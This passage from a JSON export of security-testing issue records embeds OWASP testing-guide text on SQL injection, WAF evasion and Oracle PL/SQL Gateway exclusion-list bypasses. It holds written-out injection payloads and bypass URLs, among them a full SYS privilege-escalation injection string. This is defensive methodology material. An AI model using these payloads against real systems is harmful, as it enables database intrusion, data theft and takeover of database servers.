delay the answer by 10 seconds. The tester can increase the delay time and monitor the responses. The tester also doesn\u2019t need to wait for the response. Sometimes he can set a very high value (e.g. 100) and cancel the request after some seconds.\n\n#### Stored Procedure Injection\n\nWhen using dynamic SQL within a stored procedure, the application must properly sanitize the user input to eliminate the risk of code injection. If not sanitized, the user could enter malicious SQL that will be executed within the stored procedure.\nConsider the following SQL Server Stored Procedure:\n\n\u0060\u0060\u0060\nCreate procedure user_login @username varchar(20), @passwd varchar(20)\nAs\nDeclare @sqlstring varchar(250)\nSet @sqlstring  = \u2018\nSelect 1 from users\nWhere username = \u2018 \u002B @username \u002B \u2018 and passwd = \u2018 \u002B @passwd\nexec(@sqlstring)\nGo\n\u0060\u0060\u0060\n\nUser input:\n\n\u0060\u0060\u0060\nanyusername or 1=1\u0027\nanypassword\n\u0060\u0060\u0060\n\nThis procedure does not sanitize the input, therefore allowing the return value to show an existing record with these parameters.\n\n\u003E This example may seem unlikely due to the use of dynamic SQL to log in a user but consider a dynamic reporting query where the user selects the columns to view. The user could insert malicious code into this scenario and compromise the data.\n\nConsider the following SQL Server Stored Procedure:\n\n\u0060\u0060\u0060\nCreate\nprocedure get_report @columnamelist varchar(7900)\nAs\nDeclare @sqlstring varchar(8000)\nSet @sqlstring  = \u2018\nSelect \u2018 \u002B @columnamelist \u002B \u2018 from ReportTable\u2018\nexec(@sqlstring)\nGo\n\u0060\u0060\u0060\n\nUser input:\n\n\u0060\u0060\u0060\n1 from users; update users set password = \u0027password\u0027; select *\n\u0060\u0060\u0060\n\nThis will result in the report running and all users\u2019 passwords being updated.\n\n#### Automated Exploitation\n\nMost of the situations and techniques presented here can be performed in an automated way using some tools. In this article, the tester can find information on how to perform automated auditing using [SQLMap](https://wiki.owasp.org/index.php/Automated_Audit_using_SQLMap)\n\n### SQL Injection Signature Evasion Techniques\n\nThe techniques are used to bypass defenses such as Web application firewalls (WAFs) or intrusion prevention systems (IPSs). Also refer to [https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF)\n\n#### Whitespace\n\nDropping space or adding spaces that won\u2019t affect the SQL statement. For example\n\n\u0060\u0060\u0060\nor \u0027a\u0027=\u0027a\u0027\n\nor \u0027a\u0027  =    \u0027a\u0027\n\u0060\u0060\u0060\n\nAdding special characters like a new line or tab that won\u2019t change the SQL statement execution. For example,\n\n\u0060\u0060\u0060\nor\n\u0027a\u0027=\n        \u0027a\u0027\n\u0060\u0060\u0060\n\n#### Null Bytes\n\nUse null byte (%00) before any characters that the filter is blocking.\nFor example, if the attacker may inject the following SQL\n\u0060\u0027 UNION SELECT password FROM Users WHERE username=\u0027admin\u0027--\u0060\nto add Null Bytes will be\n\u0060%00\u0027 UNION SELECT password FROM Users WHERE username=\u0027admin\u0027--\u0060\n\n#### SQL Comments\n\nAdding SQL inline comments can also help the SQL statement to be valid and bypass the SQL injection filter. Take this SQL injection as an example.\n\u0060\u0027 UNION SELECT password FROM Users WHERE name=\u0027admin\u0027--\u0060\nAdding SQL inline comments will be:\n\u0060\u0027/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/\u0027admin\u0027--\u0060\n\u0060\u0027/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/\u0027admin\u0027--\u0060\n\n#### URL Encoding\n\nUse the [online URL encoding](https://meyerweb.com/eric/tools/dencoder/) to encode the SQL statement\n\u0060\u0027 UNION SELECT password FROM Users WHERE name=\u0027admin\u0027--\u0060\nThe URL encoding of the SQL injection statement will be\n\u0060%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--\u0060\n\n#### Character Encoding\n\nChar() function can be used to replace English char. For example, char(114,111,111,116) means root\n\u0060\u0027 UNION SELECT password FROM Users WHERE name=\u0027root\u0027--\u0060\nTo apply the Char(), the SQL injection statement will be\n\u0060\u0027 UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--\u0060\n\n#### String Concatenation\n\nConcatenation breaks up SQL keywords and evades filters. Concatenation syntax varies based on the database engine. Take the MS SQL engine as an example\n\u0060select 1\u0060\nThe simple SQL statement can be changed as below by using concatenation\n\u0060EXEC(\u0027SEL\u0027 \u002B \u0027ECT 1\u0027)\u0060\n\n#### Hex Encoding\n\nHex encoding technique uses Hexadecimal encoding to replace the original SQL statement char. For example, \u0060root\u0060 can be represented as \u0060726F6F74\u0060\n\u0060Select user from users where name = \u0027root\u0027\u0060\nThe SQL statement by using the HEX value will be:\n\u0060Select user from users where name = 726F6F74\u0060\nor\n\u0060Select user from users where name = unhex(\u0027726F6F74\u0027)\u0060\n\n#### Declare Variables\n\nDeclare the SQL injection statement into a variable and execute it.\nFor example, the SQL injection statement below\n\u0060Union Select password\u0060\nDefine the SQL statement into the variable \u0060SQLivar\u0060\n\n\u0060\u0060\u0060\n; declare @SQLivar nvarchar(80); set @myvar = N\u0027UNI\u0027 \u002B N\u0027ON\u0027 \u002B N\u0027 SELECT\u0027 \u002B N\u0027password\u0027);\nEXEC(@SQLivar)\n\u0060\u0060\u0060\n\n#### Alternative Expression of \u2018or 1 = 1\u2019\n\n\u0060\u0060\u0060\nOR \u0027SQLi\u0027 = \u0027SQL\u0027\u002B\u0027i\u0027\nOR \u0027SQLi\u0027 \u0026gt; \u0027S\u0027\nor 20 \u0026gt; 1\nOR 2 between 3 and 1\nOR \u0027SQLi\u0027 = N\u0027SQLi\u0027\n1 and 1 = 1\n1 || 1 = 1\n1 \u0026\u0026 1 = 1\n\u0060\u0060\u0060\n\n### SQL Wildcard Injection\n\nMost SQL dialects support both single-character wildcards (usually \u201C\u0060?\u0060\u201D or \u201C\u0060_\u0060\u201D) and multi-character wildcards (usually \u201C\u0060%\u0060\u201D or \u201C\u0060*\u0060\u201D), which can be used in queries with the \u0060LIKE\u0060 operator. Even when appropriate controls (such as parameters or prepared statements) are used to protect against SQL injection attacks, it may be possible to inject wildcards into queries.\nFor example, if a web application allows users to enter a discount code as part of the checkout process, and it checks whether this code exists in the database using a query such as \u0060SELECT * FROM discount_codes WHERE code LIKE \u0027:code\u0027\u0060, then entering a value of \u0060%\u0060 (which would be inserted in place of the \u0060:code\u0060 parameter) would match all of the discount codes.\nThis technique could also be used to determine exact discount codes through increasingly specific queries (such as \u0060a%\u0060, \u0060b%\u0060, \u0060ba%\u0060, etc).\n\n## \n\n## Tools\n\n* [SQL Injection Fuzz Strings (from wfuzz tool) - Fuzzdb](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection)\n* [Bernardo Damele A. G.: sqlmap, automatic SQL injection tool](http://sqlmap.org/)\n* [Muhaimin Dzulfakar: MySqloit, MySql Injection takeover tool](https://github.com/dtrip/mysqloit)\n* [SQL Injection - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)\n\n\n\u003Cbr\u003E\n","Details":null,"Implication":null,"Recommendation":"## Remediation\n\n* To secure the application from SQL injection vulnerabilities, refer to the [SQL Injection Prevention CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html).\n* To secure the SQL server, refer to the [Database Security CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html).\n\nFor generic input validation security, refer to the [Input Validation CheatSheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html).","References":"* [Top 10 2017-A1-Injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)\n* [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)\n* [SQL Injection](https://www.w3schools.com/sql/sql_injection.asp)\n\nTechnology-specific Testing Guide pages have been created for the following DBMSs:\n\n* [Oracle](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle)\n* [MySQL](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.2-Testing_for_MySQL)\n* [SQL Server](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server)\n* [PostgreSQL](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL)\n* [MS Access](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.5-Testing_for_MS_Access)\n* [NoSQL](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)\n* [ORM](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection)\n* [Client-side](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.8-Testing_for_Client-side)\n\n### Whitepapers\n\n* [Victor Chapela: \u201CAdvanced SQL Injection\u201D](http://cs.unh.edu/~it666/reading_list/Web/advanced_sql_injection.pdf)\n* [Chris Anley: \u201CMore Advanced SQL Injection\u201D](https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf)\n* [David Litchfield: \u201CData-mining with SQL Injection and Inference\u201D](https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf)\n* [Imperva: \u201CBlinded SQL Injection\u201D](https://www.imperva.com/lg/lgw.asp?pid=369)\n* [PortSwigger: \u201CSQL Injection Cheat Sheet\u201D](https://portswigger.net/web-security/sql-injection/cheat-sheet)\n* [Kevin Spett from SPI Dynamics: \u201CBlind SQL Injection\u201D](https://repo.zenk-security.com/Techniques%20d.attaques%20%20.%20%20Failles/Blind_SQLInjection.pdf)\n* [\u201CZeQ3uL\u201D (Prathan Phongthiproek) and \u201CSuphot Boonchamnan\u201D: \u201CBeyond SQLi: Obfuscate and Bypass\u201D](https://www.exploit-db.com/papers/17934/)\n* [Adi Kaploun and Eliran Goshen, Check Point Threat Intelligence \u0026 Research Team: \u201CThe Latest SQL Injection Trends\u201D](https://blog.checkpoint.com/2015/05/07/latest-sql-injection-trends/)\n\n### Documentation on SQL Injection Vulnerabilities in Products\n\n* [Anatomy of the SQL injection in Drupal\u2019s database comment filtering system SA-CORE-2015-003](https://www.vanstechelman.eu/content/anatomy-of-the-sql-injection-in-drupals-database-comment-filtering-system-sa-core-2015-003)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","hours_to_find":"1","risk":"10","logged_in":"SaltMiner","comments":"","fix_by":"6/25/2024","approvers":"Grace Hopper","influencers":"[]"}},"Asset":{"AppVersion":"3.0.1","Name":"07-Input Validation Testing","Description":"07-Input Validation Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"67f3ee4c-3f91-4951-b403-c7ad60889758","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INPV-05-1 Testing for Oracle","Severity":"High","FoundDate":"2024-06-25T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nWeb based PL/SQL applications are enabled by the PL/SQL Gateway, which is is the component that translates web requests into database queries. Oracle has developed a number of software implementations, ranging from the early web listener product to the Apache \u0060mod_plsql\u0060 module to the XML Database (XDB) web server. All have their own quirks and issues, each of which will be thoroughly investigated in this chapter. Products that use the PL/SQL Gateway include, but are not limited to, the Oracle HTTP Server, eBusiness Suite, Portal, HTMLDB, WebDB and Oracle Application Server.","TestingInstructions":"## How to Test\n\n### How the PL/SQL Gateway Works\n\nEssentially the PL/SQL Gateway simply acts as a proxy server taking the user\u2019s web request and passes it on to the database server where it is executed.\n\n1. The web server accepts a request from a web client and determines if it should be processed by the PL/SQL Gateway.\n2. The PL/SQL Gateway processes the request by extracting the requested package name, procedure, and variables.\n3. The requested package and procedure are wrapped in a block of anonymous PL/SQL, and sent to the database server.\n4. The database server executes the procedure and sends the results back to the Gateway as HTML.\n5. The gateway sends the response, via the web server, back to the client.\n\nUnderstanding this point is important - the PL/SQL code does not exist on the web server but, rather, in the database server. This means that any weaknesses in the PL/SQL Gateway or any weaknesses in the PL/SQL application, when exploited, give an attacker direct access to the database server; no amount of firewalls will prevent this.\nURLs for PL/SQL web applications are normally easily recognizable and generally start with the following (xyz can be any string and represents a Database Access Descriptor, which you will learn more about later):\n\n* \u0060http://www.example.com/pls/xyz\u0060\n* \u0060http://www.example.com/xyz/owa\u0060\n* \u0060http://www.example.com/xyz/plsql\u0060\n\nWhile the second and third of these examples represent URLs from older versions of the PL/SQL Gateway, the first is from more recent versions running on Apache. In the plsql.conf Apache configuration file, /pls is the default, specified as a Location with the PLS module as the handler. The location need not be /pls, however. The absence of a file extension in a URL could indicate the presence of the Oracle PL/SQL Gateway. Consider the following URL:\n\u0060http://www.server.com/aaa/bbb/xxxxx.yyyyy\u0060\nIf \u0060xxxxx.yyyyy\u0060 were replaced with something along the lines of \u0060ebank.home\u0060, \u0060store.welcome\u0060, \u0060auth.login\u0060, or \u0060books.search\u0060, then there\u2019s a fairly strong chance that the PL/SQL Gateway is being used. It is also possible to precede the requested package and procedure with the name of the user that owns it - i.e. the schema - in this case the user is \u0060webuser\u0060:\n\u0060http://www.server.com/pls/xyz/webuser.pkg.proc\u0060\nIn this URL, xyz is the Database Access Descriptor, or DAD. A DAD specifies information about the database server so that the PL/SQL Gateway can connect. It contains information such as the TNS connect string, the user ID and password, authentication methods, and so on. These DADs are specified in the \u0060dads.conf\u0060 Apache configuration file in more recent versions or the \u0060wdbsvr.app\u0060 file in older versions. Some default DADs include the following:\n\n\u0060\u0060\u0060\nSIMPLEDAD\nHTMLDB\nORASSO\nSSODAD\nPORTAL\nPORTAL2\nPORTAL30\nPORTAL30_SSO\nTEST\nDAD\nAPP\nONLINE\nDB\nOWA\n\u0060\u0060\u0060\n\n#### Determining if the PL/SQL Gateway is Running\n\nWhen performing an assessment against a server, it\u2019s important first to know what technology you\u2019re actually dealing with. If you don\u2019t already know, for example, in a black box assessment scenario, then the first thing you need to do is work this out. Recognizing a web based PL/SQL application is pretty easy. First, there is the format of the URL and what it looks like, discussed above. Beyond that there are a set of simple tests that can be performed to test for the existence of the PL/SQL Gateway.\n\n#### Server Response Headers\n\nThe web server\u2019s response headers are a good indicator as to whether the server is running the PL/SQL Gateway. The table below lists some of the typical server response headers:\n\n\u0060\u0060\u0060\nOracle-Application-Server-10g\nOracle-Application-Server-10g/10.1.2.0.0\u00A0Oracle-HTTP-Server\nOracle-Application-Server-10g/9.0.4.1.0\u00A0Oracle-HTTP-Server\nOracle-Application-Server-10g\u00A0OracleAS-Web-Cache-10g/9.0.4.2.0\u00A0(N)\nOracle-Application-Server-10g/9.0.4.0.0\nOracle\u00A0HTTP\u00A0Server\u00A0Powered\u00A0by\u00A0Apache\nOracle\u00A0HTTP\u00A0Server\u00A0Powered\u00A0by\u00A0Apache/1.3.19\u00A0(Unix)\u00A0mod_plsql/3.0.9.8.3a\nOracle\u00A0HTTP\u00A0Server\u00A0Powered\u00A0by\u00A0Apache/1.3.19\u00A0(Unix)\u00A0mod_plsql/3.0.9.8.3d\nOracle\u00A0HTTP\u00A0Server\u00A0Powered\u00A0by\u00A0Apache/1.3.12\u00A0(Unix)\u00A0mod_plsql/3.0.9.8.5e\nOracle\u00A0HTTP\u00A0Server\u00A0Powered\u00A0by\u00A0Apache/1.3.12\u00A0(Win32)\u00A0mod_plsql/3.0.9.8.5e\nOracle\u00A0HTTP\u00A0Server\u00A0Powered\u00A0by\u00A0Apache/1.3.19\u00A0(Win32)\u00A0mod_plsql/3.0.9.8.3c\nOracle\u00A0HTTP\u00A0Server\u00A0Powered\u00A0by\u00A0Apache/1.3.22\u00A0(Unix)\u00A0mod_plsql/3.0.9.8.3b\nOracle\u00A0HTTP\u00A0Server\u00A0Powered\u00A0by\u00A0Apache/1.3.22\u00A0(Unix)\u00A0mod_plsql/9.0.2.0.0\nOracle_Web_Listener/4.0.7.1.0EnterpriseEdition\nOracle_Web_Listener/4.0.8.2EnterpriseEdition\nOracle_Web_Listener/4.0.8.1.0EnterpriseEdition\nOracle_Web_listener3.0.2.0.0/2.14FC1\nOracle9iAS/9.0.2\u00A0Oracle\u00A0HTTP\u00A0Server\nOracle9iAS/9.0.3.1\u00A0Oracle\u00A0HTTP\u00A0Server\n\u0060\u0060\u0060\n\n#### The NULL Test\n\nIn PL/SQL, \u0060null\u0060 is a perfectly acceptable expression:\n\n\u0060\u0060\u0060\nSQL\u003E\u00A0BEGIN\n\u00A0\u00A0NULL;\n\u00A0\u00A0END;\n\u00A0\u00A0/\nPL/SQL\u00A0procedure\u00A0successfully\u00A0completed.\n\u0060\u0060\u0060\n\nWe can use this to test if the server is running the PL/SQL Gateway. Simply take the \u0060DAD\u0060 and append \u0060NULL\u0060, then append \u0060NOSUCHPROC\u0060:\n\n* \u0060http://www.example.com/pls/dad/null\u0060\n* \u0060http://www.example.com/pls/dad/nosuchproc\u0060\n\nIf the server responds with a \u0060200 OK\u0060 response for the first and a \u0060404 Not Found\u0060 for the second then it indicates that the server is running the PL/SQL Gateway.\n\n#### Known Package Access\n\nOn older versions of the PL/SQL Gateway, it is possible to directly access the packages that form the PL/SQL Web Toolkit such as the OWA and HTP packages. One of these packages is the \u0060OWA_UTIL\u0060 package, which we\u2019ll speak about more later on. This package contains a procedure called SIGNATURE and it simply outputs in HTML a PL/SQL signature. Thus requesting\n\u0060http://www.example.com/pls/dad/owa_util.signature\u0060\nreturns the following output on the webpage\n\u0060\u0022This page was produced by the PL/SQL Web Toolkit on date\u0022\u0060\nor\n\u0060\u0022This page was produced by the PL/SQL Cartridge on date\u0022\u0060\nIf you don\u2019t get this response but a 403 Forbidden response then you can infer that the PL/SQL Gateway is running. This is the response you should get in later versions or patched systems.\n\n#### Accessing Arbitrary PL/SQL Packages in the Database\n\nIt is possible to exploit vulnerabilities in the PL/SQL packages that are installed by default in the database server. How you do this depends on the version of the PL/SQL Gateway. In earlier versions of the PL/SQL Gateway, there was nothing to stop an attacker from accessing an arbitrary PL/SQL package in the database server. We mentioned the \u0060OWA_UTIL\u0060 package earlier. This can be used to run arbitrary SQL queries:\n\u0060http://www.example.com/pls/dad/OWA_UTIL.CELLSPRINT?\u00A0P_THEQUERY=SELECT\u002BUSERNAME\u002BFROM\u002BALL_USERS\u0060\nCross Site Scripting attacks could be launched via the HTP package:\n\u0060http://www.example.com/pls/dad/HTP.PRINT?CBUF=\u003Cscript\u003Ealert(\u0027XSS\u0027)\u003C/script\u003E\u0060\nClearly, this is dangerous, so Oracle introduced a PLSQL Exclusion list to prevent direct access to such dangerous procedures. Banned items include any request starting with \u0060SYS.*\u0060, any request starting with \u0060DBMS_*\u0060, any request with \u0060HTP.*\u0060 or \u0060OWA*\u0060. It is possible to bypass the exclusion list however. What\u2019s more, the exclusion list does not prevent access to packages in the \u0060CTXSYS\u0060 and \u0060MDSYS\u0060 schemas or others, so it is possible to exploit flaws in these packages:\n\u0060http://www.example.com/pls/dad/CXTSYS.DRILOAD.VALIDATE_STMT?SQLSTMT=SELECT\u002B1\u002BFROM\u002BDUAL\u0060\nThis will return a blank HTML page with a 200 OK response if the database server is still vulnerable to this flaw (CVE-2006-0265)\n\n### Testing the PL/SQL Gateway For Flaws\n\nOver the years, the Oracle PL/SQL Gateway has suffered from a number of flaws, including access to admin pages (CVE-2002-0561), buffer overflows (CVE-2002-0559), directory traversal bugs, and vulnerabilities that allow attackers to bypass the Exclusion List and go on to access and execute arbitrary PL/SQL packages in the database server.\n\n### Bypassing the PL/SQL Exclusion List\n\nIt is incredible how many times Oracle has attempted to fix flaws that allow attackers to bypass the exclusion list. Each patch that Oracle has produced has fallen victim to a new bypass technique. [The history of this sorry story](http://seclists.org/fulldisclosure/2006/Feb/0011.html)\n\n### Bypassing the Exclusion List - Method 1\n\nWhen Oracle first introduced the PL/SQL Exclusion List to prevent attackers from accessing arbitrary PL/SQL packages, it could be trivially bypassed by preceding the name of the schema/package with a hex encoded newline character or space or tab:\n\n\u0060\u0060\u0060\nhttp://www.example.com/pls/dad/%0ASYS.PACKAGE.PROC\nhttp://www.example.com/pls/dad/%20SYS.PACKAGE.PROC\nhttp://www.example.com/pls/dad/%09SYS.PACKAGE.PROC\n\u0060\u0060\u0060\n\n### Bypassing the Exclusion List - Method 2\n\nLater versions of the Gateway allowed attackers to bypass the exclusion list by preceding the name of the schema/package with a label. In PL/SQL a label points to a line of code that can be jumped to using the GOTO statement and takes the following form: \u0060\u003C\u003CNAME\u003E\u003E\u0060\n\n* \u0060http://www.example.com/pls/dad/\u003C\u003CLBL\u003E\u003ESYS.PACKAGE.PROC\u0060\n\n### Bypassing the Exclusion List - Method 3\n\nSimply placing the name of the schema/package in double quotes could allow an attacker to bypass the exclusion list. Note that this will not work on Oracle Application Server 10g as it converts the user\u2019s request to lowercase before sending it to the database server and a quote literal is case sensitive - thus \u0060SYS\u0060 and \u0060sys\u0060 are not the same and requests for the latter will result in a 404 Not Found. On earlier versions though the following can bypass the exclusion list:\n\u0060http://www.example.com/pls/dad/\u0022SYS\u0022.PACKAGE.PROC\u0060\n\n### Bypassing the Exclusion List - Method 4\n\nDepending upon the character set in use on the web server and on the database server, some characters are translated. Thus, depending upon the character sets in use, the \u0060\u00FF\u0060 character (\u00600xFF\u0060) might be converted to a \u0060Y\u0060 at the database server. Another character that is often converted to an upper case \u0060Y\u0060 is the Macron character - \u00600xAF\u0060. This may allow an attacker to bypass the exclusion list:\n\u0060http://www.example.com/pls/dad/S%FFS.PACKAGE.PROC\u0060 \u0060http://www.example.com/pls/dad/S%AFS.PACKAGE.PROC\u0060\n\n### Bypassing the Exclusion List - Method 5\n\nSome versions of the PL/SQL Gateway allow the exclusion list to be bypassed with a backslash - \u00600x5C\u0060:\n\u0060http://www.example.com/pls/dad/%5CSYS.PACKAGE.PROC\u0060\n\n### Bypassing the Exclusion List - Method 6\n\nThis is the most complex method of bypassing the exclusion list and is the most recently patched method. If we were to request the following\n\u0060http://www.example.com/pls/dad/foo.bar?xyz=123\u0060\nthe application server would execute the following at the database server:\n\n\u0060\u0060\u0060\ndeclare\n\u00A0rc__\u00A0number;\n\u00A0start_time__\u00A0binary_integer;\n\u00A0simple_list__\u00A0owa_util.vc_arr;\n\u00A0complex_list__\u00A0owa_util.vc_arr;\nbegin\n\u00A0start_time__\u00A0:=\u00A0dbms_utility.get_time;\n\u00A0owa.init_cgi_env(:n__,:nm__,:v__);\n\u00A0htp.HTBUF_LEN\u00A0:=\u00A0255;\n\u00A0null;\n\u00A0null;\n\u00A0simple_list__(1)\u00A0:=\u00A0\u0027sys.%\u0027;\n\u00A0simple_list__(2)\u00A0:=\u00A0\u0027dbms\\_%\u0027;\n\u00A0simple_list__(3)\u00A0:=\u00A0\u0027utl\\_%\u0027;\n\u00A0simple_list__(4)\u00A0:=\u00A0\u0027owa\\_%\u0027;\n\u00A0simple_list__(5)\u00A0:=\u00A0\u0027owa.%\u0027;\n\u00A0simple_list__(6)\u00A0:=\u00A0\u0027htp.%\u0027;\n\u00A0simple_list__(7)\u00A0:=\u00A0\u0027htf.%\u0027;\n\u00A0if\u00A0((owa_match.match_pattern(\u0027foo.bar\u0027,\u00A0simple_list__, complex_list__,\u00A0true)))\u00A0then\n\u00A0\u00A0rc__\u00A0:=\u00A02;\n\u00A0else\n\u00A0\u00A0null;\n\u00A0\u00A0orasso.wpg_session.init();\n\u00A0\u00A0foo.bar(XYZ=\u003E:XYZ);\n\u00A0\u00A0if\u00A0(wpg_docload.is_file_download)\u00A0then\n\u00A0\u00A0\u00A0rc__\u00A0:=\u00A01;\n\u00A0\u00A0\u00A0wpg_docload.get_download_file(:doc_info);\n\u00A0\u00A0\u00A0orasso.wpg_session.deinit();\n\u00A0\u00A0\u00A0null;\n\u00A0\u00A0\u00A0null;\n\u00A0\u00A0\u00A0commit;\n\u00A0\u00A0else\n\u00A0\u00A0\u00A0rc__\u00A0:=\u00A00;\n\u00A0\u00A0\u00A0orasso.wpg_session.deinit();\n\u00A0\u00A0\u00A0null;\n\u00A0\u00A0\u00A0null;\n\u00A0\u00A0\u00A0commit;\n\u00A0\u00A0\u00A0owa.get_page(:data__,:ndata__);\n\u00A0\u00A0end\u00A0if;\n\u00A0end\u00A0if;\n\u00A0:rc__\u00A0:=\u00A0rc__;\n\u00A0:db_proc_time__\u00A0:=\u00A0dbms_utility.get_time\u2014start_time__;\nend;\n\u0060\u0060\u0060\n\nNotice lines 19 and 24. On line 19, the user\u2019s request is checked against a list of known \u201Cbad\u201D strings, i.e., the exclusion list. If the requested package and procedure do not contain bad strings, then the procedure is executed on line 24. The XYZ parameter is passed as a bind variable.\nIf we then request the following:\n\u0060http://server.example.com/pls/dad/INJECT\u0027POINT\u0060\nthe following PL/SQL is executed:\n\n\u0060\u0060\u0060\n..\nsimple_list__(7)\u00A0:=\u00A0\u0027htf.%\u0027;\nif\u00A0((owa_match.match_pattern(\u0027inject\u0027point\u0027,\u00A0simple_list__ complex_list__,\u00A0true)))\u00A0then\n\u00A0rc__\u00A0:=\u00A02;\nelse\n\u00A0null;\n\u00A0orasso.wpg_session.init();\n\u00A0inject\u0027point;\n..\n\u0060\u0060\u0060\n\nThis generates an error in the error log: \u201CPLS-00103: Encountered the symbol \u2018POINT\u2019 when expecting one of the following. . .\u201D What we have here is a way to inject arbitrary SQL. This can be exploited to bypass the exclusion list. First, the attacker needs to find a PL/SQL procedure that takes no parameters and doesn\u2019t match anything in the exclusion list. There are a good number of default packages that match this criteria, for example:\n\n\u0060\u0060\u0060\nJAVA_AUTONOMOUS_TRANSACTION.PUSH\nXMLGEN.USELOWERCASETAGNAMES\nPORTAL.WWV_HTP.CENTERCLOSE\nORASSO.HOME\nWWC_VERSION.GET_HTTP_DATABASE_INFO\n\u0060\u0060\u0060\n\nAn attacker should pick one of these functions that is actually available on the target system (i.e., returns a \u0060200 OK\u0060 when requested). As a test, an attacker can request\n\u0060http://server.example.com/pls/dad/orasso.home?FOO=BAR\u0060\nthe server should return a \u0060404 File Not Found\u0060 response because the orasso.home procedure does not require parameters and one has been supplied. However, before the 404 is returned, the following PL/SQL is executed:\n\n\u0060\u0060\u0060\n..\n..\nif\u00A0((owa_match.match_pattern(\u0027orasso.home\u0027,\u00A0simple_list__,\u00A0complex_list__,\u00A0true)))\u00A0then\n rc__\u00A0:=\u00A02;\nelse\n null;\n orasso.wpg_session.init();\n orasso.home(FOO=\u003E:FOO);\n..\n..\n\u0060\u0060\u0060\n\nNote the presence of FOO in the attacker\u2019s query string. Attackers can abuse this to run arbitrary SQL. First, they need to close the brackets:\n\u0060http://server.example.com/pls/dad/orasso.home?);--=BAR\u0060\nThis results in the following PL/SQL being executed:\n\n\u0060\u0060\u0060\n..\norasso.home();--=\u003E:);--);\n..\n\u0060\u0060\u0060\n\nNote that everything after the double minus (\u0060--\u0060) is treated as a comment. This request will cause an internal server error because one of the bind variables is no longer used, so the attacker needs to add it back. As it happens, it\u2019s this bind variable that is the key to running arbitrary PL/SQL. For the moment, they can just use \u0060HTP.PRINT\u0060 to print BAR, and add the needed bind variable as :1:\n\u0060http://server.example.com/pls/dad/orasso.home?);HTP.PRINT(:1);--=BAR\u0060\nThis should return a \u0060200\u0060 with the word \u201CBAR\u201D in the HTML. What\u2019s happening here is that everything after the equals sign - BAR in this case - is the data inserted into the bind variable. Using the same technique it\u2019s possible to also gain access to \u0060owa_util.cellsprint\u0060 again:\n\u0060http://www.example.com/pls/dad/orasso.home?);OWA_UTIL.CELLSPRINT(:1);--=SELECT\u002BUSERNAME\u002BFROM\u002BALL_USERS\u0060\nTo execute arbitrary SQL, including DML and DDL statements, the attacker inserts an execute immediate :1:\n\u0060http://server.example.com/pls/dad/orasso.home?);execute%20immediate%20:1;--=select%201%20from%20dual\u0060\nNote that the output won\u2019t be displayed. This can be leveraged to exploit any PL/SQL injection bugs owned by SYS, thus enabling an attacker to gain complete control of the backend database server. For example, the following URL takes advantage of the SQL injection flaws in \u0060DBMS_EXPORT_EXTENSION\u0060\n\n\u0060\u0060\u0060\nhttp://www.example.com/pls/dad/orasso.home?);\nexecute%20immediate%20:1;--=DECLARE%20BUF%20VARCHAR2(2000);%20BEGIN%20\nBUF:=SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(\u0027INDEX_NAME\u0027,\u0027INDEX_SCHEMA\u0027,\u0027DBMS_OUTPUT.PUT_LINE(:p1); EXECUTE%20IMMEDIATE%20\u0027\u0027CREATE%20OR%20REPLACE%20\nPUBLIC%20SYNONYM%20BREAKABLE%20FOR%20SYS.OWA_UTIL\u0027\u0027;\nEND;--\u0027,\u0027SYS\u0027,1,\u0027VER\u0027,0);END;\n\u0060\u0060\u0060\n\n### 